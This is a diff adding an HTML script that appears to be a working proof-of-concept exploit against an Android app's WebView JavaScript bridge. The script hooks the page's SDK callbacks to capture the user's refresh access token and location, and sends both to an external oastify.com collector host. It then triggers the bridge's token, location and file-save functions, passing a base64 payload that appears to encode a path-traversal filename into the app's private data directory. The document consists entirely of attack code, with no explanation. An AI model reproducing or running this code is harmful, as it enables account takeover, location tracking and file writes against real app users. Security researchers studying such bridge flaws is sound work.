@@ -1,0 +1,72 @@
+
+<script>
+
+(function () {
+  let sdk = {};
+
+  Object.defineProperty(window, "_appSDK", {
+    configurable: true,
+    get() {
+      return sdk;
+    },
+    set(value) {
+      if (typeof value !== "object" || value === null) {
+        value = {};
+      }
+
+    sdk = value;
+
+    if (typeof sdk.ciamApp !== "object" || sdk.ciamApp === null) {
+        sdk.ciamApp = {};
+      }
+    
+    if (typeof sdk.location !== "object" || sdk.location === null) {
+        sdk.location = {};
+      }
+
+    const original = sdk.ciamApp.returnRefreshAccessToken;
+    const original_location = sdk.location.returnLocation;
+
+    sdk.ciamApp.returnRefreshAccessToken = function (dt) {
+        console.log("[CAPTURED data]", dt);
+        window.__capturedAAA = dt;
+
+        fetch(
+          "https://qpj7vkaaib2yx6vrs0nm50ofd6jx7ovd.oastify.com/?data=" +
+            encodeURIComponent(dt)
+        );
+
+        if (typeof original === "function") {
+          return original.apply(this, arguments);
+        }
+      };
+
+      sdk.location.returnLocation = function (loc) {
+        console.log("[CAPTURED location]", loc);
+        window.__capturedAAA = loc;
+
+        fetch(
+          "https://qpj7vkaaib2yx6vrs0nm50ofd6jx7ovd.oastify.com/?location=" +
+            encodeURIComponent(loc)
+        );
+
+        if (typeof original_location === "function") {
+          return original_location.apply(this, arguments);
+        }
+      };
+    }
+  });
+
+  // Initialize safely
+  window._appSDK = {};
+})();
+
+Android.requestLocation();
+
+Android.saveFile("ewogICJtaW1lVHlwZSI6ICJ0ZXh0L3BsYWluIiwKICAiZmlsZW5hbWUiOiAiLi4vLi4vLi4vLi4vLi4vLi4vLi4vZGF0YS9kYXRhL2RlLmRobC5wYWtldC9wb2MudHh0IiwKICAiZmlsZUNvbnRlbnQiOiAiVkdocGN5QnBjeUJoSUhCdll5QTZLUW9LQ2dvS0NnPT0iCn0=")
+
+Android.refreshAccessToken(
+  "eyJjb3JyZWxhdGlvbklkIjoiYjI3Y2M0NTEtOWI1OS00ZGRmLTg4ZTktZjkxOTNiY2NkMzk5IiwiYWZ0ZXJNYXN0ZXJEYXRhQ2hhbmdlIjpmYWxzZSwidG9rZW5SZWZyZXNoUGFyYW1ldGVyIjp7ImJTeW5jaHJvbml6ZUxvZ2luU3RhdHVzV2l0aENJQU0iOnRydWUsImJGb3JjZVJlZnJlc2giOnRydWUsImJBZnRlck1hc3RlckRhdGFDaGFuZ2UiOmZhbHNlfX0="
+);
+
+</script>
